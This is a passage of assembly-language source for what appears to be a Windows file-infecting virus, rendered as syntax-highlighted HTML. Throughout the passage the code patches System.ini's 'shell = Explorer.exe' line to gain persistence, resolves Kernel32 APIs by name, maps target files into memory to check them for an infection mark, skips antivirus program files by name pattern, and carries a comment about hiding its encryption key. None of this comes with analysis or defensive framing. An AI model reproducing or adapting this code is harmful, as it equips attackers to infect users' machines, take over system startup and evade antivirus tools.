        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CopyFileA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">file_in_use</span><span class="sc0">

        </span><span class="sc1">; server isn't installed</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">file_data</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_find</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_in_use</span><span class="sc0">

        </span><span class="sc1">; Save "System.ini" size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">file_data.FileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_file_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; open and map "System.ini"</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_mapp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">clsfind</span><span class="sc0">

        </span><span class="sc1">; Bigger than our buffer ?</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_file_size</span><span class="sc4">],</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">unmap_sys</span><span class="sc0">

        </span><span class="sc1">; Look for "hell = Explorer.exe"</span><span class="sc0">

</span><span class="sc5">_@1</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"lleh"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_@2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_@1</span><span class="sc0">

        </span><span class="sc1">; add string path "hell = Explorer.exe" to eax</span><span class="sc0">

</span><span class="sc5">_@2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">

        </span><span class="sc1">; If string = space, then System.ini</span><span class="sc0">
        </span><span class="sc1">; is already infected</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">unmap_sys</span><span class="sc0">

        </span><span class="sc1">; Save this address for later use</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addr_sys</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; Copy System.ini to our buffer</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_space</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_file_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; Point esi to our string</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">Net_sign</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; Unmap with old file size</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unmap</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_file_size</span><span class="sc4">],</span><span class="sc2">0Dh</span><span class="sc0">

        </span><span class="sc1">; And re-map with new</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_mapp</span><span class="sc0">

        </span><span class="sc1">; Don't forget to copy last bytes</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addr_sys</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_space</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_file_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; Close search handle and unmap file</span><span class="sc0">

</span><span class="sc5">unmap_sys</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unmap</span><span class="sc0">
</span><span class="sc5">clsfind</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_find</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindClose</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">file_in_use</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetCommandLineA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">cmd_line</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">208h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">reset_var</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">; clear direction flag to avoid errors</span><span class="sc0">
        </span><span class="sc1">; And copy old keys to return buffer</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">old_value_rva</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">new_value_rva</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">movsd</span><span class="sc0">
                </span><span class="sc6">movsd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">open_mapp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">; Open and Map file in memory. Returns eax = 0 on error or</span><span class="sc0">
        </span><span class="sc1">; Mapped address if success</span><span class="sc0">

        </span><span class="sc1">; Try don't show our encryption</span><span class="sc0">
        </span><span class="sc1">; key putting many zeros in code</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFileA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_new_file</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">error_bef_create</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_file_size</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; file size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_new_file</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_mapping</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">error_aft_create</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_file_size</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; file size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_mapping</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_addr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close_bef_mappin</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">unmap</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_addr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_mapping</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">close_bef_mappin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_mapping</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_file_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_new_file</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_new_file</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetEndOfFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">error_aft_create</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_new_file</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">error_bef_create</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">locate_api</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; retrieve api's from Kernel32.dll</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">api_name</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">api_addr</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; push api name</span><span class="sc0">

</span><span class="sc5">locate_again</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">kernel32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Gloria_exit</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">look_4_name</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">look_4_name</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">locate_again</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">chk_fl_name</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc1">; Process file name</span><span class="sc0">
        </span><span class="sc1">; avoid anti-virus infection</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc3">"DNAP"</span><span class="sc0">                </span><span class="sc1">; PAND*.*</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@7@@</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc3">"_SSC"</span><span class="sc0">                </span><span class="sc1">; CSS_*.*</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@7@@</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc3">"NACS"</span><span class="sc0">                </span><span class="sc1">; SCAN*.*</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@7@@</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc3">"-F"</span><span class="sc0">           </span><span class="sc1">; F-*.*</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@7@@</span><span class="sc0">

        </span><span class="sc1">; avoid to infect files with "V" in the name</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"V"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@7@@</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@7@@</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@7@@</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">check_cod</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_addr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; check infectin mark</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
